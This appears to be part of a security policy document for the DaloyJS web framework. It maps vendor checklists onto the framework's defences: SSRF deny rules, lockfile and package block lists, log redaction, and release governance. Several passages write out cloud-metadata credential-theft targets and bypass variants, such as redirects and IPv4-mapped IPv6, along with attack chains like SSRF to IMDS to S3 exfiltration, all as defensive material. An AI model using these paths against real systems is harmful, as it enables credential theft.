| **Level 0 — Don't do authentication by yourself.** | Core ships `bearerAuth()`, `basicAuth()`, signed-cookie `session()`, first-party `createJwtVerifier` / `createJwtSigner` with mandatory algorithm allowlist (no `none`, no `alg` from header), and first-party JWKS resolution via `jwk()` ([`src/jwk.ts`](src/jwk.ts), [`src/jwt.ts`](src/jwt.ts), [`src/security-schemes.ts`](src/security-schemes.ts)). Credential storage and rotation, OAuth flow correctness, password hashing (`argon2` / `bcrypt`), and WebAuthn / passkeys are explicitly delegated to identity providers and dedicated libraries — § Explicitly out of scope says so plainly, and WebAuthn / passkeys is on the Hardening roadmap as a thin wrapper over a vetted library. |
| **Level 0 — Never do your own cryptography.** | Core uses Web Crypto / `node:crypto` exclusively (HMAC for `csrf()` and `session()`, `randomUUID` / `getRandomValues` for nonces, `timingSafeEqual` for credential comparisons). The CI gate `pnpm verify:secret-comparisons` rejects the full short-circuiting comparison family (`===`, `!==`, `.startsWith`, `.endsWith`, `.includes`, `.indexOf`, `.localeCompare`) against any header-derived value in `src/`, so a contributor cannot accidentally roll their own constant-time check. Webhook HMAC helpers parse only known algorithm prefixes (`sha256=…`) and never strip on bare `=` to avoid truncating padded base64 signatures. See the **Credential timing attacks** row in the in-scope table. |
| **Level 1 — CI/CD with SAST/DAST.** | **SAST:** CodeQL runs JavaScript/TypeScript and `actions` queries on every PR and on a schedule ([`.github/workflows/codeql.yml`](.github/workflows/codeql.yml)); `zizmor` statically analyses every workflow ([`.github/workflows/zizmor.yml`](.github/workflows/zizmor.yml)); OpenSSF Scorecard publishes a continuous scorecard ([`.github/workflows/scorecard.yml`](.github/workflows/scorecard.yml)); the ~20 first-party `verify:*` gates in [`scripts/`](scripts) act as project-specific SAST tailored to the framework's threat model. **DAST:** [`.github/workflows/dast.yml`](.github/workflows/dast.yml) boots the bookstore example app via [`examples/dast-server.ts`](examples/dast-server.ts) on a weekly schedule (plus `workflow_dispatch`) and runs the OWASP ZAP baseline scan against it, exercising header sanitization, `secureHeaders()` output, CORS, redirects, body-cap, and router path-traversal rejection against a real listening server rather than against the source AST. The job fails on HIGH-risk findings; MEDIUM / LOW / INFO are summarized for triage. Closes the dynamic half of the [Aikido SAST vs DAST](https://www.aikido.dev/blog/sast-vs-dast-what-you-need-to-now) guidance. The same SAST + DAST stack ships in [`packages/create-daloy/templates/_ci/`](packages/create-daloy/templates/_ci) so a fresh scaffold inherits the posture, with the scaffolded DAST workflow pointed at the user's built app and documented in [`scaffolded SECURITY.md`](packages/create-daloy/templates/_ci/node/SECURITY.md). |
| **Level 1 — Monitor your dependencies.** | Daily `pnpm audit --prod` against the committed lockfile ([`.github/workflows/vuln-scan.yml`](.github/workflows/vuln-scan.yml), 06:13 UTC) so newly-disclosed CVEs are surfaced even on quiet days; Dependabot weekly updates for `npm`, `github-actions`, and (in the scaffolded `_ci/`) `docker` ecosystems. `@daloyjs/core`'s zero-runtime-deps posture shrinks the surface to monitor to "your own application tree". |
| **Level 1 — Check your dependencies for malware.** | `pnpm verify:no-vulnerable-sandboxes` walks every tracked `package.json` and the root `pnpm-lock.yaml` and refuses any direct dep or resolved version of `vm2` / `vm2-sandbox-escape` / `safe-eval` / `notevil` / `static-eval` / `eval-sandbox`; `pnpm verify:no-runtime-deps` enforces zero runtime deps on `@daloyjs/core`; `pnpm verify:no-lifecycle-scripts` refuses install hooks in the published manifest of either Daloy package. The 24 h `minimum-release-age` cooldown + `ignore-scripts=true` in both root and template `_npmrc` files keeps consumers off the malicious-republish hot path. Operators should layer Socket / Aikido / Snyk on their **own** application tree — Daloy contributes nothing to that tree that those tools need to scan. |
| **Level 1 — Use lockfiles to protect your supply chain.** | The root [`pnpm-lock.yaml`](pnpm-lock.yaml) is committed, `prefer-frozen-lockfile=true` and `verify-store-integrity=true` are pinned in the root [`.npmrc`](.npmrc), and `pnpm verify:lockfile` ([`scripts/verify-lockfile-sources.ts`](scripts/verify-lockfile-sources.ts)) refuses any lockfile entry resolved from a non-registry source (`git+`, `git://`, `ssh://`, `github:`, `gitlab:`, `bitbucket:`, `gist:`, raw `git@…`, or any tarball URL outside `registry.npmjs.org`). Every `create-daloy` template ships its own `pnpm-lock.yaml` and `_npmrc` with the same posture so a fresh scaffold installs reproducibly. |
| **Level 1 — Use a web application firewall (WAF / RASP).** | Out of scope at the framework layer — the article's own recommendation is to front the app with AWS WAF / CloudFlare / Aikido Zen. Daloy's contribution is to make the WAF's job smaller: body cap, header CRLF/NUL rejection, router path-traversal rejection, real `405`, per-handler timeout, magic-byte file validation, and trusted-proxy header gating all run in core **before** user code, so a WAF that the operator chooses to deploy is augmenting a default-deny request path rather than backstopping a permissive one. |
| **Level 2 — Container best practices** (updated base images, restricted privileges, minimal runner). | Covered in detail in the **Aikido x Root.io container & base-image hardening mapping** above. The shipped [`_Dockerfile`](packages/create-daloy/templates/node-basic/_Dockerfile) runs as non-root UID 1001 with `tini` as PID 1, `STOPSIGNAL SIGTERM`, `HEALTHCHECK` wired to `/readyz`, no `curl` / no extra packages, `NODE_IMAGE` build-arg for digest pinning, and `pnpm install --frozen-lockfile --ignore-scripts` in the build stage. The scaffolded [`container-scan.yml`](packages/create-daloy/templates/_ci/node/_github/workflows/container-scan.yml) runs hadolint + Trivy filesystem + Trivy image (`severity: HIGH,CRITICAL`, blocking on CRITICAL) on every PR, every push to `main`, and on a weekly cron. Operators should run the container with `--read-only` / `readOnlyRootFilesystem: true` as documented in the scaffolded [`SECURITY.md`](packages/create-daloy/templates/_ci/node/SECURITY.md). |
| **Level 2 — Cloud account separation, CSPM, cloud budget alerts.** | Operator territory by definition — Daloy is a framework, not a cloud platform. The scaffolded [`SECURITY.md`](packages/create-daloy/templates/_ci/node/SECURITY.md) recommends keeping development, staging, and production in separate cloud accounts and enabling the provider's built-in budget alerts; we deliberately do not vend a CSPM tool. |
| **Beyond — Check LLM integrations for OWASP Top 10 for LLMs.** | Daloy does not embed an LLM in core; if a consumer's handler calls an LLM provider (OpenAI, Anthropic, an in-process model), the OWASP LLM Top 10 (prompt injection, training data poisoning, model DoS, sensitive information disclosure, …) applies to the handler, not to the framework. Core's contribution is the JSON-first, default-deny request path described above so an LLM-augmented attacker (§ AI-accelerated attackers) cannot land a Spring4Shell / SSTI / Log4Shell / Buffer-leak / case-mutated-auth-bypass variant against the framework itself. |
| **Beyond — Implement a secure development life cycle (shift left).** | Every quality gate listed above runs on every PR, every push to `main`, and inside the publish job — the `verify:*` family is the shift-left layer for the framework's own threat model. § Mapping to the 5 pillars of a Secure SDLC below makes the SDLC mapping explicit. |

What this **does not** defend against, said explicitly so vibe coders do
not mis-scope the claim:

- **Insecure handler code the LLM wrote for you.** Daloy cannot stop a
  route that concatenates SQL with `req.query`, that passes user input to
  `child_process.exec`, that renders user input into HTML via an
  application-level template engine the consumer chose to install, or
  that logs a raw `Authorization` header. The framework's response path
  redacts known-sensitive headers ([`src/logger.ts`](src/logger.ts)
  `redactRecord()`) and the **Log-message expression injection** row in
  the in-scope table closes the Log4Shell class in *core*'s logger, but
  a third-party logger the consumer wires in is their surface.
- **The consumer's own application dependency tree.** `@daloyjs/core`
  contributes zero runtime deps, so a vulnerability in *some other*
  package the consumer installs is theirs to monitor — pair Daloy with
  Socket / Aikido / Snyk / `pnpm audit` on the application's tree, as
  the article recommends.
- **A vibe coder who runs the AI-generated code without reading any of
  the docs above.** The framework's controls only fire if the consumer
  uses the shipped primitives (`secureHeaders`, `rateLimit`,
  `loadShedding`, `csrf`, `session`, `bearerAuth`, `basicAuth`,
  `fileField` with `magicBytes`, `createJwtVerifier`, the scaffolded
  `_Dockerfile`, the scaffolded `_npmrc`, the scaffolded `_gitignore`).
  Disabling them, replacing them with hand-rolled equivalents, or
  removing them from the scaffolded template is an opt-out away from
  the shipped posture and outside what the framework can enforce.

### Aikido "Top 7 cloud security vulnerabilities" mapping

The Aikido 2025-12-04 write-up
["Top 7 Cloud Security Vulnerabilities"](https://www.aikido.dev/blog/top-cloud-security-vulnerabilities)
enumerates seven recurring failure modes that put cloud workloads in the
news: Instance Metadata Service (IMDS) abuse, Kubernetes cluster CVEs,
weak network segmentation, FluentBit logging-agent CVEs, vulnerable
container base images, misconfigured firewalls / WAFs (the Capital One
SSRF → IMDS chain), and over-permissive serverless / IAM. DaloyJS is a
web framework, not a cloud platform — Kubernetes cluster security, VPC
segmentation, and IAM policy authoring are operator territory by
definition — but for every item the framework can plausibly influence
the controls already ship in core or in `create-daloy`'s scaffolded
templates. The table below is the explicit mapping so an operator
evaluating Daloy against the article can answer "what does the
framework already do, and what is left for me?" without grepping the
codebase.

| Aikido item | DaloyJS / `create-daloy` control |
| --- | --- |
| **1. IMDS Vulnerability** (CVE-2025-51591 Pandoc-style SSRF to `169.254.169.254` to steal short-lived IAM credentials). | `fetchGuard()` ([`src/fetch-guard.ts`](src/fetch-guard.ts)) is the framework-layer prevention for this exact class. Default-deny posture rejects every documented cloud metadata IP — AWS / Azure / DigitalOcean `169.254.169.254` (link-local), GCP `metadata.google.internal` (link-local), Alibaba `100.100.100.200` (CGNAT, always-deny), Oracle Cloud `192.0.0.192` (IANA-reserved, always-deny) — before any network call. Redirects are followed manually with re-validation at every hop so a `302 → http://169.254.169.254/` cannot bypass the check; `file:` / `data:` / `gopher:` / `ftp:` are rejected pre-DNS; IPv4-mapped IPv6 (`::ffff:169.254.169.254`) is recursively re-checked against the embedded IPv4. The framework cannot force the host to run IMDSv2 — that is an EC2 launch-template setting — but the SSRF path the Pandoc attack relied on is closed at the handler boundary when user-controlled outbound fetches go through `fetchGuard()`. Regression-tested in [`tests/fetch-guard.test.ts`](tests/fetch-guard.test.ts) (literal `169.254.169.254`, IPv4-mapped IPv6 form, DNS-resolution-time, and redirect-time variants). See also the **Outbound SSRF** row in the in-scope table above. |
| **2. Kubernetes Vulnerabilities** (CVE-2020-8559 default service-account token abuse, cluster-level privilege escalation). | Out of scope at the framework layer — kube-apiserver patching, RBAC, NetworkPolicy, and PodSecurity admission are cluster-operator concerns. Daloy's contribution is the workload-side defense in depth that limits blast radius if a pod is compromised: the scaffolded [`_Dockerfile`](packages/create-daloy/templates/node-basic/_Dockerfile) runs as non-root UID 1001 with `tini` as PID 1 and no `curl` / package manager in the runtime stage; the scaffolded [`SECURITY.md`](packages/create-daloy/templates/_ci/node/SECURITY.md) instructs operators to deploy with `readOnlyRootFilesystem: true`, drop all capabilities, set `automountServiceAccountToken: false` on pods that don't need the kube API, and bind the workload to a dedicated ServiceAccount with the minimum RBAC verbs needed. A compromised handler in a Daloy pod cannot mint new tokens or write to the filesystem if these are set. |
| **3. Weak Network Segmentation** (flat networks → lateral movement, Target-2013-style). | Operator territory by definition — VPC / subnet / SecurityGroup / NetworkPolicy design is not something a web framework can author for you. Daloy's contribution is to make the workload behave correctly inside a properly segmented network: `ipRestriction()` ([`src/ip-restriction.ts`](src/ip-restriction.ts)) gives handler-level CIDR allow/deny against the post-proxy client IP; `connInfo()` ([`src/conn-info.ts`](src/conn-info.ts)) honors a configured trusted-proxy chain rather than naively trusting `X-Forwarded-For` (so an attacker on a flat overlay cannot spoof a "trusted internal" client IP through the workload); the scaffolded `SECURITY.md` calls out separate dev / staging / prod accounts and least-privilege egress as required posture. The **Trusted-proxy header spoofing** row in the in-scope table above is the regression-tested guarantee for the workload half. |
| **4. FluentBit Vulnerabilities** (CVE-2025-12969 auth bypass, CVE-2025-12972 path traversal via unsanitized tag values, etc. — log agent compromise → log tampering, RCE). | Daloy does not bundle, embed, or recommend a specific log-shipping agent. The core logger ([`src/logger.ts`](src/logger.ts)) emits structured JSON to stdout with `redactRecord()` masking `authorization`, `cookie`, `set-cookie`, `proxy-authorization`, AWS / GitHub / npm / Stripe / Slack token shapes, JWT, PEM blocks, and `*_authToken=` patterns **before** the log line leaves the process — so even if FluentBit (or any log agent) is later compromised on the host, the pre-redacted payload denies the agent a credential to exfiltrate. Operators choose their own log shipper; the scaffolded `SECURITY.md` recommends running it in a sidecar with its own ServiceAccount and pinning its image digest. The **Token-value leaked into a log line** mapping below is the regression posture for the framework half of this surface. |
| **5. Container Image Vulnerabilities** (vulnerable base images, transitive CVEs in the runtime layer). | Covered in detail in the **Aikido x Root.io container & base-image hardening mapping** above. Short version: shipped [`_Dockerfile`](packages/create-daloy/templates/node-basic/_Dockerfile) uses a `NODE_IMAGE` build-arg so operators can pin to a digest (`node:22-bookworm-slim@sha256:…`), runs as non-root UID 1001 with `tini` as PID 1, ships no `curl` / package manager in the runtime stage, sets `STOPSIGNAL SIGTERM` and a `HEALTHCHECK` against `/readyz`, and uses `pnpm install --frozen-lockfile --ignore-scripts` in the build stage. The scaffolded [`container-scan.yml`](packages/create-daloy/templates/_ci/node/_github/workflows/container-scan.yml) runs hadolint + Trivy filesystem + Trivy image (`severity: HIGH,CRITICAL`, blocking on CRITICAL) on every PR, every push to `main`, and on a weekly cron — so a base-image CVE disclosed mid-week surfaces by Monday at the latest even if nobody opens a PR. |
| **6. Misconfigured Firewalls** (Capital One 2019 — SSRF in the WAF used to reach `169.254.169.254` and steal IAM credentials → 100M records). | Same `fetchGuard()` defense as item 1, applied at the handler layer rather than the WAF layer. The Capital One chain was *WAF SSRF → IMDSv1 → IAM credentials → S3 exfil*. A Daloy handler that wraps user-controlled outbound `fetch` with `fetchGuard()` short-circuits the second hop regardless of how the first hop got there, and the framework's default-deny request path (body cap, header CRLF/NUL rejection, router path-traversal rejection, real `405`, per-handler timeout) makes the WAF's job smaller rather than larger — Daloy is augmenting a default-deny path, not backstopping a permissive one (same posture documented in the **Level 1 — Use a web application firewall (WAF / RASP)** row of the vibe-coders mapping above). The scaffolded `SECURITY.md` also calls out IMDSv2-only as required posture on the underlying compute. |
| **7. Misconfigured Serverless Functions** (overly permissive IAM, e.g. Lambda with `s3:*` → exfil every bucket). | Operator territory by definition — IAM policy authoring is not something a web framework can do for you, and a Daloy app deployed to Lambda / Cloud Run / Workers / Fly inherits whatever execution role the operator attached. Daloy's contribution is to make the *runtime* posture compatible with least-privilege: zero runtime dependencies in `@daloyjs/core` (no transitive package can demand a permission your IAM role doesn't grant), `defineConfig()` reads from `process.env` / Workers `env` / Deno `Deno.env` so secrets are loaded from the platform's secret manager rather than baked into the image, and the runtime-parity audits ([`pnpm verify:runtime-parity`](scripts)) ensure the same handler runs identically across Node / Bun / Deno / Workers / Vercel without needing a node-only escape hatch. The scaffolded [`SECURITY.md`](packages/create-daloy/templates/_ci/node/SECURITY.md) instructs operators to scope the execution role to the minimum verbs the workload actually calls (S3 `GetObject` on a single prefix, not `s3:*`) and to enable the provider's IAM-access-analyzer / unused-permission scan. |

What this **does not** defend against, said explicitly so operators do
not mis-scope the claim:

- **Item 1 if the operator never wraps the outbound call.** `fetchGuard()`
  is opt-in by design — the framework cannot intercept a raw `fetch()` in
  user code without breaking handlers that legitimately need to call
  `127.0.0.1` (sidecars), `10.0.0.0/8` (internal services), or
  `169.254.169.254` (legitimate IMDSv2 reads from a worker). The scaffolded
  example handlers use `fetchGuard()` for any user-controlled URL and the
  in-scope table above is explicit about which calls need the wrapper.
- **Items 2, 3, 7** — kube-apiserver patching, VPC design, and IAM policy
  authoring. Daloy ships hardened *workload* defaults so the blast radius
  is contained if these go wrong, but the controls themselves live outside
  the framework.
- **Item 4 if a third-party log agent is run with elevated privileges and
  access to unredacted application memory.** The framework's `redactRecord()`
  protects the *log line*; it cannot protect against an agent that scrapes
  `/proc/<pid>/environ` or the workload's secret manager directly. Run the
  agent as a non-root sidecar with its own ServiceAccount, as the scaffolded
  `SECURITY.md` recommends.

### npm publishing

- **Releases are isolated.** The publish workflow
  (`.github/workflows/release.yml`) is triggered only by a signed tag push or
  manual maintainer dispatch. It never runs from a PR, never runs from a
  branch, and never shares a runner with code that came from a fork.
- **Core and CLI releases are intentionally split.** Pushing a signed `v*` tag
  publishes `@daloyjs/core` after verification and protected-environment
  approval. `create-daloy` is published by manually dispatching
  `release.yml` with `package=create-daloy` (or `package=all`) so the CLI is
  not released accidentally on every core tag.
- **`id-token: write` is granted only to the publish job**, only after a
  protected GitHub Environment (`npm-publish`) requires explicit maintainer
  approval. There is no long-lived `NPM_TOKEN` in repo secrets.
- **Publishes use `--provenance`.** Every tarball is bound to its source
  commit and workflow run via npm trusted publishing (OIDC) and Sigstore.
- **Tag/version match is verified** before `pnpm publish` runs.
- **No third-party install scripts run during publish.** Install uses
  `--ignore-scripts`; the few packages that legitimately need to build are
  allowlisted via `pnpm.onlyBuiltDependencies` in `package.json`.

### Maintainer accounts

- **Hardware-backed 2FA is mandatory on npm and GitHub** for every account
  with write access to the `daloyjs/daloy` repository AND every npm account
  with publish rights to `@daloyjs/core` or `create-daloy`. SMS factors are
  not permitted. 2FA enforcement is configured at the GitHub organization
  level (`Settings → Authentication security → Require two-factor
  authentication`) and at the npm registry level (`npm access 2fa-required`
  on each published package), so an account without 2FA cannot push to
  `main`, approve the `npm-publish` GitHub Environment, or run
  `npm publish`. Maintainers should rotate credentials immediately after any
  ecosystem-wide phishing campaign (e.g. `npmjs.help`-style lookalikes).
- **Removal of an account is part of the off-boarding checklist.** Whenever
  a contributor with publish access leaves rotation, the maintainer
  off-boarding step revokes their GitHub organization membership, their npm
  publish grant, and any granular tokens scoped to `@daloyjs/*` packages
  before their last day.
- **Granular npm access tokens only**, scoped to a single package, with IP
  allowlists where the maintainer's network supports it.
- **No publishing from a developer machine.** All published artifacts come
  from `release.yml`.
- **Signed commits and signed tags** for every release.

### Release checklist

1. Commit the prepared version/docs changes to `main`.
2. Create and push a signed `v*` tag for the core package version.
3. Approve the pending `npm-publish` environment for the tag-triggered core release.
4. Manually dispatch `release.yml` with `package=create-daloy` when the CLI version also needs publishing.
5. Confirm every contributor who approved the `npm-publish` Environment for
   this release has hardware-backed 2FA enabled at both the GitHub
   organization level and the npm registry level. (Mandatory-2FA
   audit gate.)
6. Confirm the GitHub actor on the publish run is listed in the ACTIVE block
   of [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md). The release
   gate refuses to publish otherwise.

### Mapping to the 5 pillars of a Secure SDLC

Operators occasionally ask how Daloy maps onto the generic Secure-SDLC
checklists that show up in vendor blog posts (e.g. Aikido's
["Secure SDLC for Engineering Teams"](https://www.aikido.dev/blog/secure-sdlc)
five-pillar model: Visibility, Early Feedback, Developer Adoption,
Consistency, Actionability). We are an open-source backend framework, not an
organization with a security program, so the mapping is necessarily narrower
than an internal SSDLC — but every pillar has a concrete control or a
documented out-of-scope boundary. We list them here so the answer is one
link, not a guessing game.

| Pillar | What Daloy ships | What is out of scope (and why) |
| --- | --- | --- |
| **Visibility** | Public source tree, public [`PROJECT_HISTORY.md`](PROJECT_HISTORY.md) changelog, `@daloyjs/core`'s **zero runtime dependencies** (enforced by [`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts)) so the transitive tree is exactly the dev/test deps in [`pnpm-lock.yaml`](pnpm-lock.yaml). Every published tarball carries an npm **provenance attestation** (Sigstore + OIDC) that binds the bytes to the source commit and the `release.yml` run. `pnpm audit --prod` runs on every PR and every publish. Every tarball also ships a **CycloneDX 1.5** (`dist/sbom.cdx.json`) and **SPDX 2.3** (`dist/sbom.spdx.json`) SBOM generated by [`scripts/generate-sbom.ts`](scripts/generate-sbom.ts) and locked against the manifest at publish time by [`pnpm verify:sbom`](scripts/verify-sbom.ts) — the `@daloyjs/core` SBOM has zero `components`/`packages` entries (the zero-runtime-deps invariant re-checked from the SBOM bytes). | Inventorying the *consumer's* applications, cloud assets, or running deployments. That is an operator-side ASPM concern (Aikido, Snyk, Wiz, etc.) and the framework cannot do it for them. |
| **Early Feedback** | Security feedback runs **inside the PR**, not at release time: `zizmor` ([`.github/workflows/zizmor.yml`](.github/workflows/zizmor.yml)) statically rejects unsafe workflow patterns; CodeQL ([`.github/workflows/codeql.yml`](.github/workflows/codeql.yml)) runs JavaScript/TypeScript and `actions` queries; OpenSSF Scorecard ([`.github/workflows/scorecard.yml`](.github/workflows/scorecard.yml)) publishes a continuous score; `pnpm verify:parity-audits` / `verify:governance-audits` / `verify:runtime-parity-audits` / `verify:routing-hardening-audits` / `verify:secret-comparisons` / `verify:no-runtime-deps` / `verify:lockfile` enforce the documented security floor on every PR; Dependabot ([`.github/dependabot.yml`](.github/dependabot.yml)) opens PRs weekly for actions and npm deps. CODEOWNERS ([`.github/CODEOWNERS`](.github/CODEOWNERS)) requires a maintainer to approve any change under `.github/`, `package.json`, `pnpm-lock.yaml`, or `.npmrc`. | Author-time IDE feedback (SAST in the editor). We do not bundle a proprietary scanner — operators who want that should layer Snyk / Aikido / Semgrep / GitHub Advanced Security on top, none of which conflict with our gates. |
| **Developer Adoption** | Security gates live in the same commands developers already run: `pnpm typecheck`, `pnpm test`, `pnpm coverage`, `pnpm coverage:branches`, and the `verify:*` family are documented in [`AGENTS.md`](AGENTS.md) as the quality gate for every change. The list is short and reused for human contributors, CI, and AI agents — there is no separate "security checklist" that drifts out of sync. The scaffolded templates ([`packages/create-daloy/templates/`](packages/create-daloy/templates)) inherit the same defaults (`.npmrc` with `ignore-scripts=true` and `minimum-release-age=1440`, `_gitignore` excluding `.env*`, etc.) so consumer apps start with the framework's security posture, not a stripped-down one. | Adoption inside the *consumer's* org. That is a cultural change owned by the consumer's engineering leadership; the most we can do is ship safe defaults and document them. |
| **Consistency** | The **governance floor** (above) is enforced by [`pnpm verify:governance-audits`](scripts/verify-governance-audits.ts) on every PR: it refuses to merge a change that removes top-level `permissions:`, `persist-credentials: false`, a SHA-pin on a third-party action, `step-security/harden-runner` on workflows that use third-party actions, a runtime dep on `@daloyjs/core`, [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md), or [`.github/CODEOWNERS`](.github/CODEOWNERS). Removal of any control requires a documented `SECURITY.md` entry and maintainer-quorum sign-off. The same `verify:*` family runs identically in `ci.yml` and the pre-publish `verify` job in `release.yml`, so a PR cannot pass CI under one rule set and be published under a weaker one. | Enforcing the same rules across *consumer* repositories. We document the recommended posture (see § Supply-chain security and the per-incident tables above) and ship the same defaults in scaffolded templates, but we cannot police a downstream project's CI. |
| **Actionability** | When an incident in the broader ecosystem matches a Daloy-relevant attack pattern, we publish a step-by-step mapping table (see the `shopsprint`, `node-ipc 2026-05-14`, GitHub VS Code-extension, and ToxicSkills tables above) that says, per attack step, which Daloy control catches it and which steps are explicitly out of scope. The recurring quarterly **disclosure exercise** (above) verifies that the private-report inbox, the active maintainer rotation, the `npm-publish` Environment, the `verify:governance-audits` gate, and every active contact's recovery-email domain are still working — a missed quarter fails CI loud. [`PROJECT_HISTORY.md`](PROJECT_HISTORY.md) records the date and outcome of each exercise. | Prioritizing findings *inside the consumer's* application. Daloy does not bundle an ASPM dashboard; consumers who need one should pair the framework with their existing AppSec stack. |

If an SSDLC checklist surfaces an item that maps onto a class of attack the
framework should defend against and currently does not, treat the gap as a
release-blocking bug and open a private advisory.

### Mapping to Aikido Package Health (consumer-facing scoring rubric)

Aikido's 2026-02-03
[Package Health Score](https://www.aikido.dev/blog/introducing-aikido-package-health)
rates an npm package on **five weighted categories** — *Dependencies*,
*Maintainer Stability*, *Maturity*, *Supply-Chain Scripts*, *Attestations* —
that a consumer can look up at <https://intel.aikido.dev/packages> before
installing. Operators occasionally ask which Daloy controls back each
category so the answer is one link, not guesswork. The mapping below is
explicit, and every claim either points at a file in this repo or at a
governance gate that runs in CI.

| Aikido category | What it measures | DaloyJS control |
| --- | --- | --- |
| **Dependencies** | "How stable the dependency tree is between versions." Penalises churn in the transitive tree. | `@daloyjs/core` declares **zero runtime dependencies** ([`package.json`](package.json)). [`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts) and the governance floor refuse a PR that adds one. There is no transitive runtime tree to churn — installing `@daloyjs/core` adds the bytes of the package itself, nothing more. Adapter bindings (`hono`, `@cloudflare/workers-types`, `zod`, etc.) are `peerDependencies` chosen by the consumer. |
| **Maintainer Stability** | "How consistent the release authors are and whether maintainership has shifted unexpectedly." Penalises unexpected handovers. | Active release authors are documented in [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md) and verified each quarter by the disclosure exercise (above). Off-boarding is a step on the release checklist (§ Maintainer accounts). Every release tag is signed and every release commit is signed, so the chain of release authors is cryptographically inspectable from the git log. The pre-publish `verify` job in [`release.yml`](.github/workflows/release.yml) refuses to publish unless the actor on the publish run is listed in the **Active** block of [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md) (release gate). |
| **Maturity** | "How long the project has existed, how predictably it evolves, and whether releases follow a sensible cadence." Penalises rewritten history and erratic versioning. | Semantic versioning is enforced by hand at release time; the full ordered history of every shipped change lives in [`PROJECT_HISTORY.md`](PROJECT_HISTORY.md) (`## 9. Change log going forward`, newest at the top, one entry per release). Releases are tagged as signed `v*` tags and the tag/version match is verified before `pnpm publish` runs (§ npm publishing). The release-history is append-only: we have never force-pushed `main` and we have never deleted a published version from npm. |
| **Supply-Chain Scripts** | "How safe the package's lifecycle scripts are and whether they introduce unnecessary risk during installation." Penalises any of `preinstall` / `install` / `postinstall` / `prepare` / `preprepare` / `postprepare` / `prepublish`. | Both published packages (`@daloyjs/core`, `create-daloy`) declare **zero install-time lifecycle scripts**. Only `prepublishOnly` ships — that hook runs *on the maintainer's CI* during publish and is never executed by a consumer's `pnpm install`. The new [`pnpm verify:no-lifecycle-scripts`](scripts/verify-no-lifecycle-scripts.ts) governance gate fails a PR that adds any forbidden hook to either published manifest and runs in both [`ci.yml`](.github/workflows/ci.yml) and the pre-publish `verify` job in [`release.yml`](.github/workflows/release.yml). Consumer-side defence-in-depth: every scaffolded template ships `.npmrc` with `ignore-scripts=true`, so even an upstream dep that *does* declare a lifecycle hook will not run it on a fresh `create-daloy` project. |
| **Attestations** | "Whether the project includes verifiable provenance to prove that builds are authentic and reproducible." | Every `@daloyjs/core` and `create-daloy` tarball is published with `--provenance` (root [`.npmrc`](.npmrc) sets `provenance=true`), which binds the bytes to the source commit and the `release.yml` workflow run via npm trusted publishing (OIDC) and Sigstore. Consumers can verify the published bytes against the source commit and reject any release whose attestation cannot be re-derived from the GitHub source (§ npm publishing). Every tarball also ships a CycloneDX 1.5 SBOM (`dist/sbom.cdx.json` or `packages/create-daloy/sbom.cdx.json`) and an SPDX 2.3 SBOM (`dist/sbom.spdx.json` or `packages/create-daloy/sbom.spdx.json`) generated by [`scripts/generate-sbom.ts`](scripts/generate-sbom.ts) and locked at release time by [`pnpm verify:sbom`](scripts/verify-sbom.ts) — see § Aikido SBOM-standards mapping below. |

What this **does not** defend against, and we say so explicitly:

- A consumer who installs a *different* package that happens to have a
  poor Aikido Package Health score. The score is per-package, not
  ecosystem-wide, and Daloy can only speak to `@daloyjs/core` and
  `create-daloy`. For every other package in the consumer's tree the
  consumer should run their own Aikido / Snyk / Socket lookup.
- Aikido changing the weighting of any category. The mapping above
  describes *what we ship*, not *what score Aikido renders*. If Aikido
  reweights "Supply-Chain Scripts" tomorrow, the underlying control —
  zero install-time hooks, enforced by `verify:no-lifecycle-scripts` —
  does not change.
- A future contributor adding a runtime dep or a `postinstall` hook
  through a non-`@daloyjs/core` package in the workspace (e.g. a new
  package under [`packages/`](packages)). The current
  `verify:no-lifecycle-scripts` gate checks the two published manifests
  by name; extending it to any new publishable package is a
  release-blocking task when that package is added.

If a future Aikido category lands that maps onto a class of attack the
framework should defend against and currently does not, treat the gap as a
release-blocking bug and open a private advisory.

### Aikido SBOM-standards mapping (CycloneDX / SPDX / SWID)

Aikido's 2025 write-up
["Understanding SBOM standards: a look at CycloneDX, SPDX and SWID"](https://www.aikido.dev/blog/understanding-sbom-standards-a-look-at-cyclonedx-spdx-and-swid)
argues that a machine-readable Software Bill of Materials is now the
baseline expectation for any package that wants to be consumable by an
ASPM platform, a regulated procurement process (US EO 14028, EU CRA), or a
downstream SCA scanner that needs an authoritative dependency manifest
without crawling the registry. The article walks through the three primary
standards (CycloneDX, SPDX, SWID), their strengths and weaknesses, and the
practical advice that **the SBOM should live next to the artifact** rather
than be served from a separate vendor portal. DaloyJS ships SBOMs in both
of the article's primary-rated JSON formats (CycloneDX 1.5 and SPDX 2.3)
inside every published tarball, with a SWID tag embedded inside the
CycloneDX document so asset-management platforms that key off ISO/IEC
19770-2 identifiers can still match the same artifact.

| Aikido SBOM-standards concern | DaloyJS control |
| --- | --- |
| **CycloneDX 1.5 ("OWASP-native, security-oriented, broad JS-tooling support")** | [`scripts/generate-sbom.ts`](scripts/generate-sbom.ts) emits `dist/sbom.cdx.json` for `@daloyjs/core` and `packages/create-daloy/sbom.cdx.json` for `create-daloy` at build time. The document declares `bomFormat: "CycloneDX"`, `specVersion: "1.5"`, a deterministic `serialNumber` derived from `(name, version, timestamp)`, a `metadata.component` block describing the published artifact (name, version, license, purl, repository / homepage external refs), and a `components` array listing every entry in `package.json#dependencies` as a `pkg:npm/<name>@<version>` purl. For `@daloyjs/core` the `components` array is empty — the zero-runtime-deps invariant ([`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts)) re-checked from the SBOM bytes by [`pnpm verify:sbom`](scripts/verify-sbom.ts). |
